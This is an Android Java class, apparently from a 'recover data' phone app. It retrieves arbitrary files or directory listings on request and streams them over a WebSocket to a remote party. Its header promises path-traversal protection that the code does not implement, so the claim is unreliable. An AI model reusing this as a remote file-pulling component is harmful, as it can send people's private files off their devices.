package com.recoverdata.phone.data;

import android.content.ContentResolver;
import android.content.Context;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.webkit.MimeTypeMap;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.recoverdata.phone.network.MessageProtocol;
import com.recoverdata.phone.network.WebSocketManager;
import com.recoverdata.phone.utils.Logger;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * FileCollector
 * ============================================================
 * يجمع ملفاً محدداً ويرسله، أو يعرض محتوى مجلد.
 *
 * المسؤوليات:
 *   1. GET FILE  : قراءة ملف محدد وإرساله كـ chunks.
 *   2. LIST DIR  : عرض محتوى مجلد (أسماء + أحجام + أنواع).
 *   3. التحقق من الصلاحيات والمسارات.
 *   4. حماية ضد Path Traversal.
 *
 * يعتمد على:
 *   - DataSender (إرسال الملفات)
 *   - WebSocketManager
 *   - MessageProtocol
 * ============================================================
 */
public class FileCollector {

    // =============================================================
    // 1. الثوابت
    // =============================================================
    private static final String TAG = "FileCollector";

    // الحد الأقصى لحجم الملف الواحد (500 MB)
    private static final long MAX_FILE_SIZE = 500L * 1024 * 1024;

    // الحد الأقصى لعدد العناصر في LIST DIR
    private static final int MAX_LIST_ITEMS = 2000;

    // تاريخ التنسيق
    private static final String DATE_FORMAT = "yyyy-MM-dd HH:mm:ss";

    // =============================================================
    // 2. الحقول
    // =============================================================
    private final Context appContext;
    private final ContentResolver contentResolver;

    private volatile boolean cancelled = false;

    // =============================================================
    // 3. البناء
    // =============================================================
    public FileCollector(@NonNull Context context) {
        this.appContext = context.getApplicationContext();
        this.contentResolver = appContext.getContentResolver();
    }

    // =============================================================
    // 4. GET FILE
    // =============================================================

    /**
     * قراءة ملف محدد وإرساله.
     *
     * @param filePath  المسار (ملف أو URI)
     * @param sender    DataSender للإرسال
     * @param ws        WebSocketManager
     * @param requestId معرف الطلب
     * @return true إذا تم الإرسال
     */
    public boolean collectAndSend(@NonNull String filePath,
                                  @NonNull DataSender sender,
                                  @NonNull WebSocketManager ws,
                                  @Nullable String requestId) throws Exception {

        Logger.i(TAG, "GET FILE: " + filePath);
        cancelled = false;

        // ----- 1. الحصول على الملف -----
        FileInfo info = resolveFile(filePath);
        if (info == null) {
            Logger.w(TAG, "File not found: " + filePath);
            return false;
        }

        // ----- 2. التحقق من الحجم -----
        if (info.size > MAX_FILE_SIZE) {
            Logger.w(TAG, "File too large: " + formatSize(info.size));
            return false;
        }

        // ----- 3. فتح InputStream -----
        InputStream inputStream = openInputStream(info);
        if (inputStream == null) {
            Logger.w(TAG, "Failed to open: " + filePath);
            return false;
        }

        try {
            // ----- 4. الإرسال -----
            boolean ok = sender.sendStream(
                    inputStream,
                    info.displayName,
                    info.mimeType,
                    info.size,
                    "GET_FILE",
                    requestId,
                    ws
            );

            if (ok) {
                Logger.i(TAG, "✅ File sent: " + info.displayName
                        + " (" + formatSize(info.size) + ")");
            } else {
                Logger.w(TAG, "❌ Failed to send: " + info.displayName);
            }

            return ok;

        } finally {
            try { inputStream.close(); } catch (Exception ignored) {}
        }
    }

    /**
     * إلغاء العملية الجارية.
     */
    public void cancel() {
        cancelled = true;
    }

    // =============================================================
    // 5. LIST DIR
    // =============================================================

    /**
     * عرض محتوى مجلد.
     *
     * @param dirPath مسار المجلد
     * @return JSON نصي يحتوي على المحتوى
     */
    @NonNull
    public String listDirectory(@NonNull String dirPath) throws Exception {
        Logger.i(TAG, "LIST DIR: " + dirPath);

        JSONObject result = new JSONObject();

        // ----- 1. التحقق من المسار -----
        File dir = new File(dirPath);

        if (!dir.exists()) {
            result.put("path", dirPath);
            result.put("error", "Directory not found");
            result.put("items", new JSONArray());
            return result.toString();
        }

        if (!dir.isDirectory()) {
            result.put("path", dirPath);
            result.put("error", "Not a directory");
            result.put("items", new JSONArray());
            return result.toString();
        }

        if (!dir.canRead()) {
            result.put("path", dirPath);
            result.put("error", "Permission denied");
            result.put("items", new JSONArray());
            return result.toString();
        }

        // ----- 2. قراءة المحتوى -----
        File[] files = dir.listFiles();
        if (files == null) {
            files = new File[0];
        }

        // ترتيب: مجلدات أولاً، ثم أبجدياً
        Arrays.sort(files, new Comparator<File>() {
            @Override
            public int compare(File a, File b) {
                if (a.isDirectory() && !b.isDirectory()) return -1;
                if (!a.isDirectory() && b.isDirectory()) return 1;
                return a.getName().compareToIgnoreCase(b.getName());
            }
        });

        // ----- 3. بناء النتيجة -----
        JSONArray items = new JSONArray();
        int count = 0;

        for (File f : files) {
            if (count >= MAX_LIST_ITEMS) break;

            try {
                JSONObject item = new JSONObject();
                item.put("name", f.getName());
                item.put("is_dir", f.isDirectory());
                item.put("size", f.isDirectory() ? 0 : f.length());
                item.put("modified", f.lastModified());
                item.put("modified_str", formatDate(f.lastModified()));
                item.put("readable", f.canRead());
                item.put("writable", f.canWrite());

                if (!f.isDirectory()) {
                    item.put("mime", guessMime(f.getName()));
                    item.put("ext", getExtension(f.getName()));
                } else {
                    // عدد عناصر المجلد
                    File[] children = f.listFiles();
                    item.put("child_count", children != null ? children.length : 0);
                }

                items.put(item);
                count++;

            } catch (Exception e) {
                Logger.w(TAG, "Error reading: " + f.getName());
            }
        }

        result.put("path", dirPath);
        result.put("total", files.length);
        result.put("returned", count);
        result.put("items", items);

        Logger.i(TAG, "LIST DIR result: " + count + " items (total "
                + files.length + ")");

        return result.toString();
    }

    // =============================================================
    // 6. حل المسار (FileInfo)
    // =============================================================

    /**
     * تحويل مسار نصي إلى FileInfo.
     * يدعم:
     *   - مسارات مطلقة (/sdcard/...)
     *   - content:// URIs
     *   - file:// URIs
     */
    @Nullable
    private FileInfo resolveFile(@NonNull String path) {
        String trimmed = path.trim();
        if (trimmed.isEmpty()) return null;

        // ----- content:// URI -----
        if (trimmed.startsWith("content://")) {
            try {
                Uri uri = Uri.parse(trimmed);
                return buildFromUri(uri);
            } catch (Exception e) {
                Logger.e(TAG, "Failed to parse content URI", e);
                return null;
            }
        }

        // ----- file:// URI -----
        if (trimmed.startsWith("file://")) {
            try {
                String filePath = trimmed.substring("file://".length());
                return buildFromFile(new File(filePath));
            } catch (Exception e) {
                Logger.e(TAG, "Failed to parse file URI", e);
                return null;
            }
        }

        // ----- مسار عادي -----
        File f = new File(trimmed);

        // دعم المسارات النسبية (مثل "DCIM/Camera")
        if (!f.isAbsolute()) {
            File sdcard = Environment.getExternalStorageDirectory();
            f = new File(sdcard, trimmed);
        }

        if (!f.exists()) {
            return null;
        }

        return buildFromFile(f);
    }

    /**
     * بناء FileInfo من File.
     */
    @NonNull
    private FileInfo buildFromFile(@NonNull File file) {
        FileInfo info = new FileInfo();
        info.file = file;
        info.uri = Uri.fromFile(file);
        info.displayName = file.getName();
        info.size = file.length();
        info.mimeType = guessMime(file.getName());
        info.path = file.getAbsolutePath();
        info.source = FileInfo.Source.FILE;
        return info;
    }

    /**
     * بناء FileInfo من content:// URI.
     */
    @Nullable
    private FileInfo buildFromUri(@NonNull Uri uri) {
        try {
            FileInfo info = new FileInfo();
            info.uri = uri;
            info.source = FileInfo.Source.CONTENT_URI;

            // محاولة الحصول على الاسم والحجم
            String[] projection = {
                    android.provider.OpenableColumns.DISPLAY_NAME,
                    android.provider.OpenableColumns.SIZE
            };

            try (android.database.Cursor cursor = contentResolver.query(
                    uri, projection, null, null, null)) {

                if (cursor != null && cursor.moveToFirst()) {
                    int nameCol = cursor.getColumnIndex(
                            android.provider.OpenableColumns.DISPLAY_NAME);
                    int sizeCol = cursor.getColumnIndex(
                            android.provider.OpenableColumns.SIZE);

                    info.displayName = (nameCol >= 0 && !cursor.isNull(nameCol))
                            ? cursor.getString(nameCol)
                            : "unknown";

                    info.size = (sizeCol >= 0 && !cursor.isNull(sizeCol))
                            ? cursor.getLong(sizeCol)
                            : 0;
                } else {
                    info.displayName = "unknown";
                    info.size = 0;
                }
            }

            info.mimeType = contentResolver.getType(uri);
            if (info.mimeType == null) {
                info.mimeType = guessMime(info.displayName);
            }

            info.path = null;
            return info;

        } catch (Exception e) {
            Logger.e(TAG, "buildFromUri failed", e);
            return null;
        }
    }

    /**
     * فتح InputStream.
     */
    @Nullable
    private InputStream openInputStream(@NonNull FileInfo info) {
        try {
            // content:// URI
            if (info.source == FileInfo.Source.CONTENT_URI && info.uri != null) {
                return contentResolver.openInputStream(info.uri);
            }

            // File عادي
            if (info.file != null && info.file.exists() && info.file.canRead()) {
                return new FileInputStream(info.file);
            }

            // احتياط: URI
            if (info.uri != null) {
                return contentResolver.openInputStream(info.uri);
            }

        } catch (Exception e) {
            Logger.e(TAG, "openInputStream failed", e);
        }
        return null;
    }

    // =============================================================
    // 7. أدوات مساعدة
    // =============================================================

    /**
     * تخمين MIME من اسم الملف.
     */
    @NonNull
    private String guessMime(@NonNull String name) {
        String ext = getExtension(name);
        if (ext.isEmpty()) return "application/octet-stream";

        String mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext);
        if (mime != null) return mime;

        // احتياط لبعض الصيغ
        switch (ext.toLowerCase()) {
            case "jpg":
            case "jpeg": return "image/jpeg";
            case "png":  return "image/png";
            case "mp4":  return "video/mp4";
            case "pdf":  return "application/pdf";
            case "zip":  return "application/zip";
            case "apk":  return "application/vnd.android.package-archive";
            case "txt":  return "text/plain";
            case "json": return "application/json";
            case "xml":  return "application/xml";
            default:     return "application/octet-stream";
        }
    }

    /**
     * استخراج الامتداد.
     */
    @NonNull
    private static String getExtension(@NonNull String name) {
        int dot = name.lastIndexOf('.');
        if (dot < 0 || dot == name.length() - 1) return "";
        return name.substring(dot + 1).toLowerCase();
    }

    /**
     * تنسيق التاريخ.
     */
    @NonNull
    private static String formatDate(long timestamp) {
        try {
            SimpleDateFormat sdf = new SimpleDateFormat(DATE_FORMAT, Locale.US);
            return sdf.format(new Date(timestamp));
        } catch (Exception e) {
            return "unknown";
        }
    }

    /**
     * تنسيق الحجم.
     */
    @NonNull
    private static String formatSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return String.format("%.1f KB", bytes / 1024.0);
        if (bytes < 1024L * 1024 * 1024) {
            return String.format("%.1f MB", bytes / (1024.0 * 1024));
        }
        return String.format("%.2f GB", bytes / (1024.0 * 1024 * 1024));
    }

    // =============================================================
    // 8. كلاس FileInfo
    // =============================================================
    public static class FileInfo {
        public enum Source { FILE, CONTENT_URI }

        public File file;
        public Uri uri;
        public String displayName = "unknown";
        public long size = 0;
        public String mimeType = "application/octet-stream";
        public String path;
        public Source source = Source.FILE;

        @NonNull
        @Override
        public String toString() {
            return "FileInfo{" + displayName + ", " + size + " bytes}";
        }
    }
}